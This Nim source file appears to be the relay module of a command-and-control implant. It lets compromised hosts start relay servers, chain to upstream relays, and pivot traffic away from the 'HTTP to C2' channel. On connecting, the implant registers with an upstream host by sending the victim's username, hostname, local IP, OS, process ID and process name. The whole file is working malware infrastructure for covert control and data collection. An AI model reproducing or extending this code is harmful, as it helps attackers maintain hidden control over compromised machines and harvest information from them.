import strutils, json, times, tables
import ../../core/relay/[relay_protocol, relay_comm, relay_config]
import ../../util/sysinfo

# Local adaptive timeout calculation to avoid circular imports
proc getLocalAdaptiveTimeout(): int =
    # Start with reasonable defaults and adjust based on success/failure
    result = 100  # 100ms base timeout

# Global relay state using relay_comm.nim types - NO MORE DIRECT SOCKETS!
var g_relayServer*: RelayServer
var upstreamRelay*: RelayConnection
var isConnectedToRelay* = false

# Global variables for immediate chain info updates
var g_immediateChainInfoUpdate*: bool = false
var g_pendingChainInfo*: tuple[role: string, parentGuid: string, port: int]

# Helper functions for main.nim compatibility
proc isRelayServer*(): bool = g_relayServer.isListening
proc relayServerPort*(): int = g_relayServer.port
proc getRelayConnections*(): int = 
    let stats = getConnectionStats(g_relayServer)
    return stats.connections

# Export connection stats function for main.nim
proc getConnectionStats*(server: RelayServer): tuple[connections: int, activeConnections: int, registeredClients: int] {.exportc.} =
    let stats = relay_comm.getConnectionStats(server)
    return (connections: stats.connections, activeConnections: stats.connections, registeredClients: stats.registeredClients)

# Export broadcast message function for main.nim  
proc broadcastMessage*(server: RelayServer, message: RelayMessage): bool {.exportc.} =
    var mutableServer = server  # Create mutable copy
    let sent = relay_comm.broadcastMessage(mutableServer, message)
    return sent > 0

# Export unicast message function for main.nim (PREFERRED)
proc sendToClient*(server: RelayServer, clientID: string, message: RelayMessage): bool {.exportc.} =
    var mutableServer = server  # Create mutable copy
    return relay_comm.sendToClient(mutableServer, clientID, message)

# Export connected clients list function for main.nim
proc getConnectedClients*(server: RelayServer): seq[string] {.exportc.} =
    return relay_comm.getConnectedClients(server)

# Process relay commands - USING SAFE relay_comm.nim FUNCTIONS
proc processRelayCommand*(cmd: string): string =
    let parts = cmd.split(" ")
    if parts.len < 2:
        return "Usage: relay <command> [args]"
    
    case parts[1]:
    of "port":
        if parts.len < 3:
            return "Usage: relay port <port_number>"
        
        let port = parseInt(parts[2])
        if g_relayServer.isListening:
            return "Relay server already running on port " & $g_relayServer.port
        
        try:
            when defined debug:
                echo "[DEBUG] 🔧 RELAY COMMANDS: Starting relay server on port " & $port
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            g_relayServer = startRelayServer(port)
            
            when defined debug:
                echo "[DEBUG] 🔧 RELAY COMMANDS: After startRelayServer() call:"
                echo "[DEBUG] 🔧 RELAY COMMANDS: - isListening: " & $g_relayServer.isListening
                echo "[DEBUG] 🔧 RELAY COMMANDS: - port: " & $g_relayServer.port
            
            if g_relayServer.isListening:
                when defined debug:
                    echo "[DEBUG] 🔧 RELAY COMMANDS: ✅ Relay server started successfully!"
                
                # IMMEDIATE CHAIN INFO REPORTING: Role change detected
                var newRole = "RELAY_SERVER"
                var parentGuid = ""
                
                # If we have an upstream connection, this means we're becoming hybrid
                if upstreamRelay.isConnected:
                    newRole = "RELAY_HYBRID"
                    # TODO: Get parent GUID from upstream relay connection
                    when defined debug:
                        echo "[DEBUG] 🔗 Chain Info: HYBRID transition detected - Client becoming HYBRID on port " & $port
                else:
                    when defined debug:
                        echo "[DEBUG] 🔗 Chain Info: SERVER role detected - Starting relay server on port " & $port
                
                # Signal main loop to send chain info immediately on next cycle
                g_immediateChainInfoUpdate = true
                g_pendingChainInfo = (newRole, parentGuid, port)
                
                when defined debug:
                    echo "[DEBUG] 🔗 Chain Info: Scheduled immediate update - Role: " & newRole & ", Port: " & $port
                
                return "Relay server started on port " & $port
            else:
                when defined debug:
                    echo "[DEBUG] 🔧 RELAY COMMANDS: ❌ Relay server failed to start"
                return "Failed to start relay server on port " & $port
        except:
            return "Failed to start relay server: " & getCurrentExceptionMsg()
    
    of "connect":
        if parts.len < 3:
            return "Usage: relay connect relay://ip:port"
        
        let relayUrl = parts[2]
        if not relayUrl.startsWith("relay://"):
            return "Invalid relay URL format. Use: relay://ip:port"
        
        try:
            let cleanUrl = relayUrl.replace("relay://", "").strip(chars = {'"'})
            let urlParts = cleanUrl.split(":")
            if urlParts.len != 2:
                return "Invalid relay URL format"
            
            let host = urlParts[0]
            let port = parseInt(urlParts[1])
            
            if upstreamRelay.isConnected:
                return "Already connected to upstream relay"
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            upstreamRelay = connectToRelay(host, port)
            if upstreamRelay.isConnected:
                isConnectedToRelay = true  # Disable HTTP communication
                
                # Send registration message with complete system info
                let implantID = generateImplantID("IMPLANT")
                let route = @[implantID, "UPSTREAM"]
                
                # Collect system information for relay registration  
                let localIP = getLocalIP()
                let username = getUsername()
                let hostname = getSysHostname()
                let osInfo = getOSInfo()
                let pid = getCurrentPID()
                let processName = getCurrentProcessName()
                
                # Create complete registration data as JSON
                let regData = %*{
                    "implantID": implantID,
                    "localIP": localIP,
                    "username": username,
                    "hostname": hostname,
                    "osInfo": osInfo,
                    "pid": pid,
                    "processName": processName,
                    "timestamp": epochTime().int64,
                    "capabilities": ["relay", "client"],
                    "mode": "relay_connect"
                }
                
                let registerMsg = createMessage(REGISTER, implantID, route, $regData)
                
                if sendMessage(upstreamRelay, registerMsg):
                    # IMMEDIATE CHAIN INFO REPORTING: Role change detected
                    var newRole = "RELAY_CLIENT"
                    if g_relayServer.isListening:
                        newRole = "RELAY_HYBRID"
                    
                    # TODO: Get parent GUID from upstream relay connection
                    var parentGuid = ""
                    
                    # Signal main loop to send chain info immediately on next cycle
                    g_immediateChainInfoUpdate = true
                    g_pendingChainInfo = (newRole, parentGuid, g_relayServer.port)
                    
                    when defined debug:
                        echo "[DEBUG] 🔗 Chain Info: CONNECTION transition detected - Role: " & newRole
                        echo "[DEBUG] Connected and registered with upstream relay, HTTP communication disabled"
                    return "Connected to upstream relay at " & host & ":" & $port 
                else:
                    return "Connected but failed to register with relay"
            else:
                return "Failed to connect to relay"
        except:
            return "Failed to connect to relay: " & getCurrentExceptionMsg()
    
    of "disconnect":
        if not upstreamRelay.isConnected:
            return "Not connected to any upstream relay"
        
        try:
            # IMMEDIATE CHAIN INFO REPORTING: Role change detected
            var newRole = "STANDARD"
            if g_relayServer.isListening:
                newRole = "RELAY_SERVER"
            
            # Signal main loop to send chain info immediately on next cycle
            g_immediateChainInfoUpdate = true
            g_pendingChainInfo = (newRole, "", g_relayServer.port)
            
            when defined debug:
                echo "[DEBUG] 🔗 Chain Info: DISCONNECTION transition detected - Role: " & newRole
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            closeConnection(upstreamRelay)
            isConnectedToRelay = false  # Re-enable HTTP communication
            when defined debug:
                echo "[DEBUG] Disconnected from upstream relay, HTTP communication re-enabled"
            return "Disconnected from upstream relay (HTTP re-enabled)"
        except:
            return "Failed to disconnect: " & getCurrentExceptionMsg()
    
    of "status":
        var status = "=== Multi-Client Relay Status ===\n"
        status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
        
        let stats = getConnectionStats(g_relayServer)
        status &= "Total Connections: " & $stats.connections & "\n"
        status &= "Registered Clients: " & $stats.registeredClients & "\n"
        
        # List connected clients
        if g_relayServer.isListening and stats.registeredClients > 0:
            let connectedClients = relay_comm.getConnectedClients(g_relayServer)
            status &= "Client List: "
            for i, clientID in connectedClients:
                if i > 0: status &= ", "
                status &= clientID
            status &= "\n"
        
        status &= "Upstream Relay: " & (if upstreamRelay.isConnected: "Connected" else: "Disconnected") & "\n"
        status &= "HTTP to C2: " & (if isConnectedToRelay: "DISABLED (using relay)" else: "ENABLED") & "\n"
        status &= "Protocol: Multi-Client relay_comm.nim (secure)\n"
        status &= "Features: Auto-registration, Unicast routing, Connection pooling\n"
        return status
    
    of "stop":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        try:
            # IMMEDIATE CHAIN INFO REPORTING: Role change detected
            var newRole = "STANDARD"
            var parentGuid = ""
            
            # If we were hybrid and stop relay server, we become relay client
            if upstreamRelay.isConnected:
                newRole = "RELAY_CLIENT"
                # TODO: Get parent GUID from upstream relay connection
                when defined debug:
                    echo "[DEBUG] 🔗 Chain Info: HYBRID->CLIENT transition detected - Stopping relay server"
            else:
                when defined debug:
                    echo "[DEBUG] 🔗 Chain Info: SERVER->STANDARD transition detected - Stopping relay server"
            
            # Signal main loop to send chain info immediately on next cycle
            g_immediateChainInfoUpdate = true
            g_pendingChainInfo = (newRole, parentGuid, 0)
            
            when defined debug:
                echo "[DEBUG] 🔗 Chain Info: Scheduled immediate update - Role: " & newRole
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            closeRelayServer(g_relayServer)
            return "Multi-client relay server stopped (secure shutdown)"
        except:
            return "Failed to stop relay server: " & getCurrentExceptionMsg()
    
    of "clients":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        let stats = getConnectionStats(g_relayServer)
        var result = "=== Connected Relay Clients ===\n"
        result &= "Total connections: " & $stats.connections & "\n"
        result &= "Registered clients: " & $stats.registeredClients & "\n\n"
        
        if stats.registeredClients > 0:
            let connectedClients = getConnectedClients(g_relayServer)
            result &= "Client List:\n"
            for i, clientID in connectedClients:
                result &= "  " & $(i + 1) & ". " & clientID & "\n"
        else:
            result &= "No clients registered\n"
        
        return result
    
    of "send":
        if parts.len < 4:
            return "Usage: relay send <clientID> <message>"
        
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        let targetClientID = parts[2]
        let message = parts[3..^1].join(" ")
        
        # Create a test message to send to specific client
        let testMsg = createMessage(HTTP_RESPONSE, "RELAY-SERVER", @[targetClientID], message)
        let success = sendToClient(g_relayServer, targetClientID, testMsg)
        
        if success:
            return "Message sent to client: " & targetClientID
        else:
            return "Failed to send message to client: " & targetClientID & " (client not found or disconnected)"
    
    else:
        return "Unknown relay command. Available:\n" &
               "  relay port <port>      - Start multi-client relay server\n" &
               "  relay connect <url>    - Connect to upstream relay\n" &
               "  relay disconnect       - Disconnect from upstream\n" &
               "  relay status           - Show relay and client status\n" &
               "  relay clients          - List connected clients\n" &
               "  relay send <id> <msg>  - Send message to specific client\n" &
               "  relay stop             - Stop relay server"

# Poll relay server for new messages - USING SAFE FUNCTIONS
proc pollRelayServerMessages*(): seq[RelayMessage] =
    if not g_relayServer.isListening:
        return @[]
    
    try:
        # CRITICAL: Process ALL available messages to prevent backlog
        var allMessages: seq[RelayMessage] = @[]
        var continuePolling = true
        var pollCount = 0
        
        while continuePolling and pollCount < 10:  # Max 10 polls to prevent infinite loop
            pollCount += 1
            let adaptiveTimeout = getLocalAdaptiveTimeout()
            let messages = pollRelayServer(g_relayServer, adaptiveTimeout)
            
            if messages.len > 0:
                allMessages.add(messages)
                when defined debug:
                    echo "[DEBUG] 🔄 Relay polling cycle " & $pollCount & ": got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
            else:
                continuePolling = false  # No more messages available
                when defined debug:
                    echo "[DEBUG] 🔄 No more messages available in cycle " & $pollCount
        
        when defined debug:
            if allMessages.len > 0:
                echo "[DEBUG] 📥 Total messages processed: " & $allMessages.len & " (in " & $pollCount & " cycles)"
        
        return allMessages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] Error polling relay server messages: " & e.msg
        return @[]

# Poll upstream relay for messages - USING SAFE FUNCTIONS
proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
    when defined debug:
        echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Checking connection status: " & $upstreamRelay.isConnected
    
    if not upstreamRelay.isConnected:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Not connected, returning empty array"
        return @[]
    
    try:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Calling pollMessages with adaptive timeout"
        
        # USE SAFE FUNCTION FROM relay_comm.nim - ADAPTIVE TIMEOUT to adjust to network conditions
        let adaptiveTimeout = getLocalAdaptiveTimeout()
        let messages = pollMessages(upstreamRelay, adaptiveTimeout)
        
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
        
        return messages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Error polling upstream relay messages: " & e.msg
        upstreamRelay.isConnected = false
        return @[]

# Cleanup dead connections - USING SAFE FUNCTIONS
proc cleanupRelayConnections*() =
    if g_relayServer.isListening:
        cleanupConnections(g_relayServer)

# ============================================================================  
# LEGACY TOPOLOGY SYSTEM REMOVED - Using distributed chain relationships
# ============================================================================ 